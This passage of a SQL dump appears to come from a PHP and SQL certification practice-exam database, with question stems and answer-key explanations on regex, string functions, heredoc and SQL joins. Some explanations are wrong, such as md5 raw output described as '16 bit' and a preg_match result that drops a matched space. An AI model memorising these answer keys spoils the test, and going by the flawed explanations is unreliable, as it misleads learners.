follows:</span></span></span></p>\r\n<p><span><span><span><pre>substr(string,start,length)</pre></span></span></span></p>\r\n<p><span><span><span><span>If the start is positive, the returned string will start from the initial position of the given string. If the start is negative, the returned string will start from the end of the given string. Here length is the number of characters to be returned from the string.</span><br /><br /><span>Answer option C is incorrect. The strtr() function is used to translate certain string into another string. The syntax of the strtr() function is as follows:</span></span></span></span></p>\r\n<p><span><span><span><span><pre>strtr(string,from,to) \r\nstrtr(string,array)  </pre></span></span></span></span></p>\r\n<p><span><span><span><span><span>A</span><span>nswer option D is incorrect. The strrev() function is used to reverse the given string.</span></span></span></span></span></p>',0,'2012-11-24 14:09:09','2012-11-24 14:09:09'),
	(205,6,'Which of the following metacharacters can.....to find a non-word character?','','<p><span>Which of the following metacharacters can be used to find a non-word character?</span></p>','<p><b>Explanation:</b><span>&nbsp;Answer option D is correct.</span><br /><br /><span>The \\W metacharacter is used to find a non-word character.</span></p>\r\n<div id=\"factbodydiv4101697\" class=\"factbody\"><span class=\"snt2\"><span class=\"snt2\">Following are the metacharacters used with the regular expression:</span></span></div>\r\n<div class=\"factbody\"><span class=\"snt2\"><span class=\"snt2\"><br /></span></span></div>\r\n<div id=\"factbodydiv4101697\" class=\"factbody\">\r\n<table border=\"1\">\r\n<tbody>\r\n<tr><th>Metacharacter</th><th>Element Matches</th></tr>\r\n<tr>\r\n<td>.</td>\r\n<td>Any character</td>\r\n</tr>\r\n<tr>\r\n<td>\\d</td>\r\n<td>Any digit from 0 to 9</td>\r\n</tr>\r\n<tr>\r\n<td>\\D</td>\r\n<td>Any non-digit</td>\r\n</tr>\r\n<tr>\r\n<td>\\s</td>\r\n<td>A whitespace character</td>\r\n</tr>\r\n<tr>\r\n<td>\\S</td>\r\n<td>A non-whitespace character</td>\r\n</tr>\r\n<tr>\r\n<td>\\w</td>\r\n<td>A word character</td>\r\n</tr>\r\n<tr>\r\n<td>\\W</td>\r\n<td>A non-word character</td>\r\n</tr>\r\n</tbody>\r\n</table>\r\n</div>\r\n<p><span><br /></span></p>',0,'2012-11-24 14:10:36','2012-11-24 14:10:36'),
	(206,6,'You want to search for such users who hav.....u use to accomplish the task?','','<p><span>You want to search for such users who have not used any digit in their user names to register to your Website. Which of the following regular expressions will you use to accomplish the task?</span></p>','<p><b>Explanation:</b><span>&nbsp;Answer option B is correct.</span><br /><br /><span>The usage position of metacharacters in a regular expression determines the result of the regular expression. If caret (^) metacharacter is used inside a character list, it means the negation of a character list. Therefore, [^[:digit:]] looks for a pattern consisting of any non-digit character. Therefore, in the given scenario, you will use the [^[:digit:]] regular expression to accomplish the task.</span><br /><br /><span>Some of the predefined POSIX (Portable Operating System Interface) character classes are as follows:</span></p>\r\n<ul>\r\n<li>[:alpha:] Alphabetic characters</li>\r\n<li>[:lower:] Lower case alphabetic characters</li>\r\n<li>[:upper:] Upper case alphabetic characters</li>\r\n<li>[:digit:] Numeric digits</li>\r\n<li>[:alnum:] Alphanumeric characters</li>\r\n<li>[:space:] Non-printing space characters</li>\r\n<li>[:punct:] Punctuation characters</li>\r\n<li>[:print:] Printable characters</li>\r\n</ul>\r\n<p><span>Answer options A and D are incorrect. The caret (^) metacharacter cannot be used at the end of any regular expression.</span><br /><br /><span>Answer option C is incorrect. The ^[[:digit:]] regular expression looks for matches that start with a digit.</span></p>',0,'2012-11-24 14:12:53','2012-11-24 14:12:53'),
	(207,6,'Consider a string in the following format..... a single call?','','<p><span>Consider a string in the following format:</span></p>\r\n<p><span><pre>a*bcd/a.d</pre></span></p>\r\n<p><span><span>You want to perform regular expression in this string; however, you are unable to do this since the string contains special characters. You can make this string PCRE compatible if you convert this string in the following format:</span></span></p>\r\n<p><span><span><pre>a\\*bcd\\/a\\.d</pre></span></span></p>\r\n<p><span><span><span>Which of the following functions will you use to accomplish the task into a single call?</span></span></span></p>','<p><b>Explanation:</b><span>&nbsp;Answer option C is correct.</span><br /><br /><span>You will use the preg_quote() function to accomplish the task. The preg_quote() function is used to quote special characters. It takes a string as an input and puts a delimiter in front of every character that is part of the regular expression syntax. This function is useful when a user is searching in such a string that contains any special character, i.e.,</span></p>\r\n<p><span><pre>. \\ + * ? [ ^ ] $ ( ) { } = ! < > | : -</pre></span></p>\r\n<p><span><span>Answer option A is incorrect. The preg_split() function splits the given string by using a regular expression.</span><br /><br /><span>Answer option B is incorrect. The preg_match() function is used to perform a match by using a regular expression.</span><br /><br /><span>Answer option D is incorrect. The explode() function is a PHP string function that takes a string and splits it into separate elements of an array, using the argument provided as delimiter. Its syntax is as follows:</span></span></p>\r\n<p><span><span><pre>explode(separator,string,limit)</pre></span></span></p>\r\n<p><span><span><span>where separator specifies where to break the string, string is the string to split, limit specifies the maximum number of array elements to return.</span></span></span></p>',0,'2012-11-24 14:15:18','2012-11-24 14:15:18'),
	(208,6,'You run the following PHP script:','','<p><span>You run the following PHP script:</span></p>\r\n<p><span><pre><?php\r\nif ( preg_match(\"/[^a-z589]+/\", \"AB asdfg589nmGH\", $array) ) {\r\nprint \"<pre>\\n\";\r\nprint_r( $array );\r\nprint \"</pre>\\n\";\r\n}\r\n?> </pre></span></p>\r\n<p><span><span>What will be the output?</span></span></p>','<p><b>Explanation:</b><span>&nbsp;Answer option A is correct.</span><br /><br /><span>You have run the following PHP script:</span></p>\r\n<p><span><pre><?php\r\nif ( preg_match(\"/[^a-z589]+/\", \"AB asdfg589nmGH\", $array) ) {\r\n  print \"<pre>\\n\";\r\n  print_r( $array );\r\n  print \"</pre>\\n\";\r\n}\r\n?> </pre></span></p>\r\n<p><span><span>In the above script, there is a caret (^), due to which the script will search the strings that do not start with any lowercase alphabetical character or the numbers 5, 8, and 9. It means the script will search the pattern starting from any uppercase or numeric rather than 5, 8, 9. Hence, the output of the above script will be as follows:</span></span></p>\r\n<p><span><span><pre>Array\r\n(\r\n    [0] => AB\r\n) </pre></span></span></p>',0,'2012-11-24 14:16:53','2012-11-24 14:16:53'),
	(209,6,'Which of the following PCRE expressions i.....ch any white space character?','','<p><span>Which of the following PCRE expressions i</span><span>s used to match any white space character?</span></p>','<p><b>Explanation:</b><span>&nbsp;Answer option D is correct.</span><br /><br /><span>Perl Compatible Regular Expressions (PCRE) is a regular expression C library. Its PCRE\'s syntax is much more powerful and flexible than either of the POSIX regular expression flavors and many classic regular expression libraries.</span><br /><br /><span>Here, \'\\s\' expression is used to match any white space, \'.\' is used to match any character, \'^\' is used to match the start of the string, and \'$\' is used to match the end of the string.</span></p>',0,'2012-11-24 14:18:30','2012-11-24 14:18:30'),
	(210,6,'Consider the following PHP code snippet:','','<p><span>Consider the following PHP code snippet:</span></p>\r\n<p><span><pre>$who = \"World\";\r\necho <<<TEXT\r\n\"Hello $who\"\r\nTEXT;</pre></span></p>\r\n<p><span><span>What will be the output?</span></span></p>','<p><b>Explanation:</b><span>&nbsp;Answer option A is correct.</span><br /><br /><span>The code snippet given in the question is the example of the heredoc syntax. A heredoc string is delimited by the special operator &lt;&lt;&lt; followed by an identi?er, and the developer must need to close the string using the same identi?er. For example, the output of the following heredoc statement will be as follows:</span></p>\r\n<p><span><pre>$who = \"World\";\r\necho <<<TEXT\r\n\"Hello $who\"\r\nTEXT;</pre></span></p>\r\n<p><span><uc:hed>Output:</uc:hed><br /><span>\"Hello World\"</span><br /><br /><span>Since double quotes (\"\") are under heredoc statement, they will also get printed.</span></span></p>',0,'2012-11-24 14:21:11','2012-11-24 14:21:11'),
	(211,6,'What will be the output of the following ..... print \"$value\";\r\n}\r\n?>','','<p><span>What will be the output of the following PHP code?</span></p>\r\n<p><span><pre><?php\r\n$a = \"hi,world\";\r\n$b = array_map(\"strtoupper\", explode(\",\", $a));\r\nforeach($b as $value)\r\n{\r\n print \"$value\";\r\n}\r\n?></pre></span></p>','<p><b>Explanation:</b><span>&nbsp;Answer option A is correct.</span><br /><br /><span>The array_map() function is used to send each value of an array to a user defined function, and return an array having new values provided by the user-made function. The syntax of the array_map() function is as follows:</span></p>\r\n<p><span><pre>array_map(function,array1,array2,array3...)</pre></span></p>\r\n<p><span><span>The code will give the output as follows:</span></span></p>\r\n<p><span><span><pre><?php\r\n$a = \"hi,world\";\r\n//explode the string words between \',\' and make the character uppercase\r\n$b = array_map(\"strtoupper\", explode(\",\", $a));\r\nforeach($b as $value) \r\n{\r\n //Print every value of $b array\r\n print \"$value\";\r\n}\r\n?></pre></span></span></p>',0,'2012-11-24 14:22:44','2012-11-24 14:22:44'),
	(212,6,'Consider the following code snippet:','','<p><span>Consider the following code snippet:</span></p>\r\n<p><span><pre><php\r\n$hello = \'world\';\r\n$world = \'hello\';\r\necho $$$hello;\r\n?></pre></span></p>\r\n<p><span><span>What will be the output?</span></span></p>','<p><b>Explanation:</b><span>&nbsp;Answer option B is correct.</span><br /><br /><span>This code snippet is an example of variable of variables. It will be solved in the following steps:</span></p>\r\n<p><span><pre>$$$hello //First $hello will be resolved and it will become $$world\r\n$$world //It will again resolve and will become $hello\r\n$hello //It will again resolve and will become world\r\n//so the output will be world</pre></span></p>\r\n<p><span><span>Reference:&nbsp;</span><a target=\"_blank\" href=\"http://php.net/manual/en/language.variables.variable.php\" tabindex=\"-1\">http://php.net/manual/en/language.variables.variable.php</a></span></p>',0,'2012-11-24 14:24:10','2012-11-24 14:24:10'),
	(213,7,'Which of the following functions will you.....ou hear me?)\"?','','<p><span>Which of the following functions will you use to get the output&nbsp;</span><uc:hed>Hello world\\.\\(can you hear me\\?\\)</uc:hed><span>&nbsp;from the string&nbsp;</span><uc:hed>\"Hello world. (can you hear me?)\"</uc:hed><span>?</span></p>','<p><b>Explanation:</b><span>&nbsp;Answer options A and B are correct.</span><br /><br /><span>The quotemeta() and preg_quote() functions can be used to quote meta characters. The quotemeta() function can quote the following characters:</span><br /><br /><uc:hed>. \\ + * ? [ ^ ] ( $ )</uc:hed><span>&nbsp;</span><br /><br /><span>Answer option C is incorrect. The strip_tags() function is used to strip HTML tags.</span><br /><br /><span>Answer option D is incorrect. The strtr() function is used to translate characters or replace strings.</span><br /><br /><uc:ref>Reference:&nbsp;<a target=\"_blank\" href=\"http://in.php.net/manual/en/function.quotemeta.php\" tabindex=\"-1\">http://in.php.net/manual/en/function.quotemeta.php</a></uc:ref></p>',0,'2012-11-24 14:25:07','2012-11-24 14:25:07'),
	(214,7,'What will be the output of the following .....>\r\n','','<p><span>What will be the output of the following PHP code snippet?</span></p>\r\n<p><span><pre><?php\r\necho <<<\"FOOBAR\"\r\nHello World!\r\nFOOBAR;\r\n?></pre></span></p>\r\n<p><span><br /></span></p>','<p><b>Explanation:</b><span>&nbsp;Answer option C is correct.</span><br /><br /><span>PHP 5.3 allows Heredocs to use double quotes in string declarations. Hence, it is a valid code for PHP 5.3:</span></p>\r\n<p><span><pre><?php\r\necho <<<\"FOOBAR\"\r\nHello World!\r\nFOOBAR;\r\n?> </pre></span></p>\r\n<p><span><span>Reference: PHP Manual, Contents: \"language.types.string.php#language.types.string.syntax.heredoc\"</span></span></p>',0,'2012-11-24 14:47:40','2012-11-24 14:47:40'),
	(215,7,'Consider the following PHP code:','','<p><span>Consider the following PHP code:</span></p>\r\n<p><span><pre><php\r\necho strlen(md5(rand(),TRUE));</pre></span></p>','<p><b>Explanation:</b><span>&nbsp;Answer option A is correct.</span><br /><br /><span>The md5() function is used to calculate the md5 hash of a string. The syntax of the md5 function is as follows:</span></p>\r\n<p><span><pre>string md5 ( string $str [, bool $raw_output = false ] )</pre></span></p>\r\n<p><span><uc:hed>Note:&nbsp;</uc:hed><span>If the optional raw_output is set to TRUE, the md5 function returns a string having raw binary format with a length of 16 bit.</span><br /><br /><span>Answer options B, C, and D are incorrect. These are not valid output according to the script.</span><br /><br /><uc:ref>Reference:&nbsp;<a target=\"_blank\" href=\"http://in3.php.net/manual/en/function.md5.php\" tabindex=\"-1\">http://in3.php.net/manual/en/function.md5.php</a></uc:ref></span></p>',0,'2012-11-24 14:48:48','2012-11-24 14:48:48'),
	(216,7,'You are using a database named SalesDB to.....u use to accomplish the task?','','<p><span>You are using a database named SalesDB to keep all sales records. The SalesDB database contains a table named Orders. You are required to create a new table named OldOrders and transfer all the data from the Orders table to the new table. Which of the following statements will you use to accomplish the task?</span></p>','<p><b>Explanation:</b><span>&nbsp;Answer option A is correct.</span><br /><br /><span>According to the scenario, you will use the SELECT INTO statement. This statement creates a new table and copies the data from the existing table as per the given criteria. This statement is used as follows:</span></p>\r\n<p><span><pre>SELECT * INTO OldOrders FROM Orders</pre></span></p>\r\n<p><span><span>Answer option B is incorrect. The INSERT INTO statement is used to insert data in an existing table. It does not create a new table. The statement is used as follows:</span></span></p>\r\n<p><span><span><pre>INSERT INTO  VALUES(value1,value2) </pre></span></span></p>\r\n<p><span><span><span>Answer options C and D are incorrect. There is no such statement as ADD INTO or IMPORT INTO.</span></span></span></p>',0,'2012-11-24 14:59:34','2012-11-24 14:59:34'),
	(217,7,'&nbsp;You are using a database named Huma.....u use to accomplish the task?','','<p><span>&nbsp;You are using a database named HumanResource. You have to delete some tables from the database using SQL statements. Which of the following statements will you use to accomplish the task?</span></p>','<p><b>Explanation:</b><span>&nbsp;Answer option D is correct.</span><br /><br /><span>In order to accomplish the task, you will use the following statement:</span></p>\r\n<p><span><pre>DROP TABLE <table_name></pre></span></p>\r\n<p><span><span>Here, the DROP TABLE statement is used to drop the table, and&nbsp;</span><br /><span>the &lt;table_name&gt; specifies the name of the table to be deleted.</span><br /><br /><span>The DROP TABLE statement removes the table from the database. It can only be recovered if the backup of the database is present.</span><br /><br /><span>Answer option A is incorrect. The following statement will generate an error:</span></span></p>\r\n<p><span><span><pre>DROP TABLE <table_name> FROM DATABASE</pre></span></span></p>\r\n<p><span><span><span>Answer options B and C are incorrect. There is no such statement as DELETE TABLE.</span></span></span></p>',0,'2012-11-24 15:01:27','2012-11-24 15:01:27'),
	(218,7,'You have to select persons whose age is b.....query to accomplish the task?','','<p><span>You have to select persons whose age is between twenty-five and forty from a database named HumanResource. Which of the following criteria will you use in the query to accomplish the task?</span></p>','<p><b>Explanation:</b><span>&nbsp;Answer option D is correct.</span><br /><br /><span>In order to accomplish the task, you will use the following criteria:</span></p>\r\n<p><span><pre>BETWEEN 25 AND 40</pre></span></p>\r\n<p><span><span>The BETWEEN clause is used to search data as per the given range specified in the clause. It is mandatory to use the AND logical operator with the BETWEEN clause.</span><br /><br /><span>Answer options A, B, and C are incorrect. The BETWEEN clause uses AND operator to search the data in a given range. The &amp;, -, TO operator are not used with the BETWEEN operator.</span><br /><br /><uc:ref>Reference:&nbsp;<a target=\"_blank\" href=\"http://www.techonthenet.com/sql/between.php\" tabindex=\"-1\">http://www.techonthenet.com/sql/between.php</a></uc:ref></span></p>',0,'2012-11-24 15:02:28','2012-11-24 15:02:28'),
	(219,7,'You want to retrieve all the data from an.....u use to accomplish the task?','','<p><span>You want to retrieve all the data from any given table. You also want to ensure that no duplicate values are displayed. Which of the following SQL statements will you use to accomplish the task?</span></p>','<p><b>Explanation:</b><span>&nbsp;Answer option C is correct.</span><br /><br /><span>In order to accomplish the task, you will use the SELECT...DISTINCT statement. The DISTINCT clause is used to eliminate duplicate rows from the specified table.</span><br /><br /><span>Answer option A is incorrect. The SELECT...ALL statement is used to display all the rows in a table, including duplicate rows.</span><br /><br /><span>Answer option B is incorrect. The SELECT...TOP statement is used to display the first set of the rows specified in the TOP clause.</span><br /><br /><span>Answer option D is incorrect. The SELECT...WHERE statement is used to filter the data in a table.</span></p>',0,'2012-11-24 15:03:54','2012-11-24 15:03:54'),
	(220,7,'Martin works as a Database Administrator .....tin use to create the report?','','<p><span>Martin works as a Database Administrator for MTech Inc. He designs a database that has a table named Products. He wants to create a report listing different product categories. He does not want to display any duplicate row in the report. Which of the following SELECT statements will Martin use to create the report?</span></p>','<p><b>Explanation:</b><span>&nbsp;Answer option A is correct.&nbsp;</span><br /><br /><span>The SELECT statement in answer option A will display different product categories in the Products table. It will not display any duplicate values for Product_No and Prod_Category columns because the&nbsp;</span><b>DISTINCT</b><span>&nbsp;clause is used. The&nbsp;</span><b>DISTINCT</b><span>&nbsp;clause ensures that the resulting rows are unique.</span><br /><br /><span>Answer option B is incorrect. It will display the values of Product_No and Prod_Category columns even if they are repeated, as the&nbsp;</span><b>DISTINCT</b><span>&nbsp;clause is not used.&nbsp;</span><br /><br /><span>Answer options C and D are incorrect because the Prod_Category column is not specified with the GROUP BY clause. If a GROUP BY clause is used with the SELECT statement, all columns in the SELECT statement should either be included in the GROUP BY clause or aggregated using the aggregated function.</span></p>',0,'2012-11-24 15:05:44','2012-11-24 15:05:44'),
	(221,7,'Which of the following statements describ.....the use of a GROUP BY clause?','','<p><span>Which of the following statements describes the use of a GROUP BY clause?</span></p>','<p><b>Explanation:</b><span>&nbsp;Answer option A is correct.&nbsp;</span><br /><br /><snt refid=\"00DKY \"><br /><br />Answer option B is incorrect. The GROUP BY clause only returns a single row of information for each group of rows. It does not return information for all the rows.<br /><br />Answer option C is incorrect. The GROUP BY clause does not sort the results in ascending or descending order. The ORDER BY clause is used with the GROUP BY command to sort the result in desired order.<br /><br />Answer option D is incorrect. The ORDER BY clause used with the GROUP BY clause sorts the grouped result in desired order.<br /><br /><uc:ref>Reference:&nbsp;<a target=\"_blank\" href=\"http://etutorials.org/SQL/Mastering+Oracle+SQL/Chapter+4.+Group+Operations/4.2+The+GROUP+BY+Clause/\" tabindex=\"-1\">http://etutorials.org/SQL/Mastering+Oracle+SQL/Chapter+4.+Group+Operations/4.2+The+GROUP+BY+Clause/</a></uc:ref></snt></p>',0,'2012-11-24 15:06:40','2012-11-24 15:06:40'),
	(222,7,'You have created a table based on the fol.....se to accomplish this?','','<p><span>You have created a table based on the following data:</span></p>\r\n<p><span><pre>EmpID NUMBER (5) PRIMARY KEY\r\nEmpName VARCHAR2 (35) NOT NULL\r\nSalary NUMBER (9, 2) NOT NULL\r\nCommission NUMBER (4, 2)\r\nManagerName VARCHAR2 (25) \r\nManagerID NUMBER (5)</pre></span></p>\r\n<p><span><span>Now, you want to display the names of employees and their managers, using a self join. Which of the following&nbsp;</span><uc:kwd>SQL</uc:kwd><span>&nbsp;statements can you use to accomplish this?</span></span></p>','<p><b>Explanation:</b><span>&nbsp;Answer options A and B are correct.</span><br /><br /><span>Self-join is used to join a table to it. Each row of the table is joined to itself and to every other row of the table. The table name appears twice in the FROM clause, with two different aliases. The two aliases are treated as two different tables, and are joined to each other.</span><br /><br /><span>When performing self-join in ANSI syntax, the</span></p>\r\n<p><span><pre>JOIN .... ON </pre></span></p>\r\n<p><span><span>syntax should be used. The INNER keyword is optional.</span><br /><br /><span>Answer option C is incorrect. The LEFT OUTER JOIN specifies a join between two tables. It returns all the rows from the left table in the join expression, and only those rows that meet the join condition from the right table. The syntax of the LEFT OUTER JOIN is as follows:</span></span></p>\r\n<p><span><span><pre>SELECT column_name(s)\r\n FROM table_name1\r\n LEFT JOIN table_name2\r\n ON table_name1.column_name=table_name2.column_name</pre></span></span></p>\r\n<p><span><span><span>Answer option D is incorrect. There is no clause such as SELF JOIN in SQL.</span><br /><br /><uc:ref>Reference:&nbsp;<a target=\"_blank\" href=\"http://www.liamdelahunty.com/tips/mysql_self_join.php\" tabindex=\"-1\">http://www.liamdelahunty.com/tips/mysql_self_join.php</a></uc:ref></span></span></p>',0,'2012-11-24 15:09:29','2012-11-24 15:09:29'),
	(223,7,'A table named employees is given with fna.....t name and first name?','','<p><span>A table named employees is given with fname and lname varchar columns.</span></p>\r\n<p><span><span>Which of the following statements would return the employees\' names, in ascending order, based on their last name and first name?</span></span></p>','<p><b>Explanation:</b><span>&nbsp;Answer options C and D are correct.</span><br /><br /><span>You will use the ORDER BY clause to sort the employees name in ascending order based on their last name and first name. The default sorting method is ascending, if no method (ASC or DESC) is specified. So, in this case, both answer options C and D would return the data correctly.</span></p>',0,'2012-11-24 15:11:38','2012-11-24 15:11:38'),
	(224,7,'Which of the following joins retrieves al.....g rows from the joined table?','','<p><span>Which of the following joins retrieves all rows from one table and only the matching rows from the joined table?</span></p>','<p><b>Explanation:</b><span>&nbsp;Answer option A is correct.&nbsp;</span><br /><br /><span>The outer join returns all rows from one table and only the matching rows from the joined table. The plus symbol within parentheses ((+)) denotes an outer join in the query.</span><br /><br /><span>Answer option B is incorrect. In a non-equijoin, a query relates two tables using an operator other than the equality operator (=).</span><br /><br /><span>Answer option C is incorrect. The EQUI JOIN relates two tables using an equality operator (=). It is also known as inner join or equality join. EQUI JOIN produces only matched rows from both the tables.</span></p>',0,'2012-11-24 15:12:23','2012-11-24 15:12:23'),
	(225,7,'Angela works as a Database Administrator .....is used in this query?','','<p><span>Angela works as a Database Administrator for AznoTech Inc. She writes the following query:</span></p>\r\n<p><span><pre>SELECT Dept_Name, Emp_Name\r\n  FROM Departments d1, Employees e1\r\n  WHERE d1.Dept_No = e1.Dept_No\r\n  ORDER BY Dept_Name, Emp_Name;</pre></span></p>\r\n<p><span><span>Which of the following joins is used in this query?</span></span></p>','<div class=\"clearfix\"><b>Explanation:</b>&nbsp;Answer option C is correct.<br /><br />This query uses equijoin, as the Dept_No columns in both the tables are related using the equality (=) operator.<br /><br />Answer option A is incorrect. Self join is made on a single table. Each row of a table is combined with itself and with every other row of the table.<br /><br />Answer option B is incorrect. The outer join returns all rows from one table and only the matching rows from the joining table.&nbsp;<br /><br />Answer option D is incorrect. In a non-equijoin, a query relates two tables using an operator other than the equality operator (=).</div>',0,'2012-11-24 15:13:21','2012-11-24 15:13:21'),
	(226,7,'Ross creates a database for a school. He ..... use to define an outer join?','','<p><span>Ross creates a database for a school. He creates two tables named Students and Courses. Which of the following SELECT statements will he use to define an outer join?</span></p>','<div class=\"clearfix\"><b>Explanation:</b>&nbsp;Answer option B is correct.<br /><br />Ross will use the SELECT statement given in answer option B to define an outer join.<br />Outer join returns all rows from one table and only the matching rows from the joining table. The plus symbol surrounded by parentheses (+) denotes an outer join in the query. The outer join operator (+) can appear only in the WHERE clause.<br /><br />Answer option A is incorrect. The statement in option A is incorrect because it will return only the rows that are common in both tables.<br /><br />Answer option C is incorrect. The statement in option C is incorrect because it will return only those rows where student id and course id match.<br /><br />Answer option D is incorrect. The statement in option D is incorrect because the BETWEEN operator does not create an outer join.</div>',0,'2012-11-24 15:14:11','2012-11-24 15:14:11'),
	(227,7,'Which of the following joins will you use.....an exact match in the column?','','<p><span>Which of the following joins will you use to display data that do not have an exact match in the column?</span></p>','<p><b>Explanation:</b><span>&nbsp;Answer option D is correct.&nbsp;</span><br /><br /><span>In non-equijoin, a query relates two tables using an operator other than the equality operator (=). As you have to display data that do not have an exact match in the column, you will use an operator other than the equality operator (=). Hence, you will use non-equijoin.&nbsp;</span><br /><br /><span>Answer option A is incorrect. Outer join returns all rows from one table and only the matching rows from the joining table.</span><br /><br /><span>Answer option B is incorrect. When a query relates two tables using an equality operator (=), it is known as inner join or equijoin.</span><br /><br /><span>Answer option C is incorrect. Self join is made on a single table. Each row of the table is combined with itself and with every other row of the table.</span></p>',0,'2012-11-24 15:15:02','2012-11-24 15:15:02'),
	(228,7,'Maria writes a query that uses outer join.....are not allowed in the query?','','<p><span>Maria writes a query that uses outer join between two tables. Which of the following operators are not allowed in the query?</span></p>','<p><b>Explanation:</b><span>&nbsp;Answer options A and C are correct.</span><br /><br /><span>The operators&nbsp;</span><b>OR</b><span>&nbsp;and&nbsp;</span><b>IN</b><span>&nbsp;are not allowed in outer join operations. However, the operators&nbsp;</span><b>AND</b><span>&nbsp;and&nbsp;</span><b>=</b><span>&nbsp;can be used.</span><br /><br /><b>OR</b><span>&nbsp;is a logical operator and contains two operands. It evaluates to TRUE if either operand is TRUE and evaluates to FALSE if both operands are FALSE. Otherwise, it returns NULL.&nbsp;</span><br /><br /><span>The&nbsp;</span><b>IN</b><span>&nbsp;operator replaces a condition that uses equality comparison operators and OR logical operators.&nbsp;</span><br /><br /><span>Answer option B is incorrect.&nbsp;</span><b>AND</b><span>&nbsp;is also a logical operator and contains two operands. It evaluates to TRUE if both operands are TRUE and evaluates to FALSE if either operand is FALSE. Otherwise, it returns NULL.&nbsp;</span><br /><br /><span>Answer option D is incorrect. The&nbsp;</span><b>=</b><span>&nbsp;operator tests for equality.</span></p>',0,'2012-11-24 15:15:42','2012-11-24 15:15:42'),
	(229,7,'Symonds works as a Database Administrator..... the statement?','','<p><span>Symonds works as a Database Administrator for Blue Well Inc. The company uses an Oracle database. The database contains a table named Employees. Following is the structure of the table:</span></p>\r\n<p><span><pre>EmployeeID NUMBER (5) PRIMARY KEY\r\n EmployeeName VARCHAR2 (35) NOT NULL\r\n Salary NUMBER (9, 2) NOT NULL\r\n Commission NUMBER (4, 2) \r\n DepartmentID NUMBER (5)</pre></span></p>\r\n<p><span><span>Symonds queries the Employees table with the following statement:</span></span></p>\r\n<p><span><span><pre>SELECT e.EmployeeName, m.Salary\r\n FROM Employees e, Employees m\r\n WHERE e.EmployeeID = m.EmployeeID;\r\n</pre></span></span></p>\r\n<p><span><span><span>Which of the following types of joins is used in the statement?</span></span></span></p>','<p><b>Explanation:</b><span>&nbsp;Answer option C is correct.</span><br /><br /><span>Self join is used to join a table to itself. Each row of the table is joined to itself and to every other row of the table. The table name appears twice in the FROM clause, with two different aliases. The two aliases are treated as two different tables, and they are joined to each other using the equality operator (=).&nbsp;</span><br /><br /><span>Answer option A is incorrect. Equijoin joins two tables using the equality operator (=). It returns only matched rows from both the tables.</span><br /><br /><span>Answer option B is incorrect. Cross join produces a result set of all possible combinations of rows of the joined tables.</span><br /><br /><span>Answer option D is incorrect. An OUTER JOIN is used to join two tables. It involves a join condition using the OUTER JOIN operator with one or more columns of either of the two tables. An OUTER JOIN returns all the rows from the table without the OUTER JOIN operator and only matching rows from the table with the OUTER JOIN operator.</span></p>',0,'2012-11-24 15:19:02','2012-11-24 15:19:02'),
	(230,7,'Celina works as a Database Administrator .....o accomplish the task?','','<p><span>Celina works as a Database Administrator for Tech Mart Inc. The company uses an Oracle database. The database contains a table named Employees. Following is the structure of the table:</span></p>\r\n<p><span><pre>EmpID NUMBER (5) PRIMARY KEY\r\n EmpName VARCHAR2 (35) NOT NULL\r\n Salary NUMBER (9, 2) NOT NULL\r\n Commission NUMBER (4, 2)\r\n ManagerName VARCHAR2 (25) \r\n ManagerID NUMBER (5)</pre></span></p>\r\n<p><span><span>Celina wants to display the names of employees and their managers, using a self join. Which of the following&nbsp;</span><uc:kwd>SQL</uc:kwd><span>&nbsp;statements will she use to accomplish the task?</span></span></p>','<p><b>Explanation:</b><span>&nbsp;Answer options A and B are correct.</span><br /><br /><span>Self join is used to join a table to itself. Each row of the table is joined to itself and to every other row of the table. The table name appears twice in the FROM clause, with two different aliases. The two aliases are treated as two different tables, and are joined to each other.</span><br /><br /><span>When performing self join in&nbsp;</span><uc:kwd>ANSI</uc:kwd><span>&nbsp;syntax , the&nbsp;</span><uc:kwd>JOIN ... ON&nbsp;</uc:kwd><span>syntax should be used. The INNER keyword is optional.</span><br /><br /><span>Answer option C is incorrect. The LEFT OUTER JOIN specifies a join between two tables. It returns all the rows from the left table in the join expression, and only those rows that meet the join condition from the right table. The syntax of the LEFT OUTER JOIN is as follows:</span></p>\r\n<p><span><pre>SELECT column_name(s)\r\n FROM table_name1\r\n LEFT JOIN table_name2\r\n ON table_name1.column_name=table_name2.column_name</pre></span></p>\r\n<p><span><span>Answer option D is incorrect. There is no clause such as SELF JOIN in Oracle.</span></span></p>',0,'2012-11-24 15:20:31','2012-11-24 15:20:31'),
	(231,7,'You work as a Database Administrator for .....l you use to accomplish this?','','<p><span>You work as a Database Administrator for Dolliver Inc. The company uses an Oracle database. The database contains two tables, named Employees and Departments. You want to retrieve all matched and unmatched rows from both the tables. Which of the following types of joins will you use to accomplish this?</span></p>','<p><b>Explanation:</b><span>&nbsp;Answer option D is correct.</span><br /><br /><span>The FULL OUTER JOIN returns all rows from the left and right tables in a join expression, even if the data values in joined columns do not match.</span><br /><br /><span>Answer option A is incorrect. LEFT OUTER JOIN returns all the rows from the left table, and only those rows that meet the join condition from the right table.</span><br /><br /><span>Answer option B is incorrect. CROSS JOIN produces a result set of all possible combinations of rows drawn from each table involved in the join. In other words, Oracle combines each row of one table with each row of the other table. For example, a CROSS JOIN between two tables with five rows each produces a result set of twenty-five rows.</span><br /><br /><span>Answer option C is incorrect. RIGHT OUTER JOIN returns all the rows from the right table, and only those rows that meet the join condition from the left table.</span></p>',0,'2012-11-24 15:21:12','2012-11-24 15:21:12'),
	(232,7,'Which of the following methods of PDOStat.....t in a multi-query statement?','','<p><span>Which of the following methods of PDOStatement class returns the next result set in a multi-query statement?</span></p>','<p><b>Explanation:</b><span>&nbsp;Answer option A is correct.</span><br /><br /><span>The PDOStatement-&gt;nextRowset() method of PDOStatement class returns the next result set in a multi-query statement.</span><br /><br /><span>Answer option B is incorrect. The PDOStatement-&gt;rowCount() method returns the number of rows affected by the last SQL statement.</span><br /><br /><span>Answer option C is incorrect. The PDOStatement-&gt;fetchAll() method returns an array containing all of the result set rows.</span><br /><br /><span>Answer option D is incorrect. The PDOStatement-&gt;fetch() method fetches the next row from a result set.</span></p>',0,'2012-11-24 15:21:59','2012-11-24 15:21:59'),
	(233,7,'You want to check whether the header has .....u use to accomplish the task?','','<p><span>You want to check whether the header has already been sent or not. Which of the following code segments will you use to accomplish the task?</span></p>','<div class=\"clearfix\"><b>Explanation:</b>&nbsp;Answer option B is correct.<br /><br />Headers_sent() returns true when header is sent and returns false when header is not sent.<br /><br />Answer option A is incorrect. This option is incorrect as it is calling header_list which wrong function as the correct function is headers_list().<br /><br />Answer options C and D are incorrect. These are not the valid functions to accomplish the task.</div>',0,'2012-11-24 15:22:47','2012-11-24 15:22:47'),
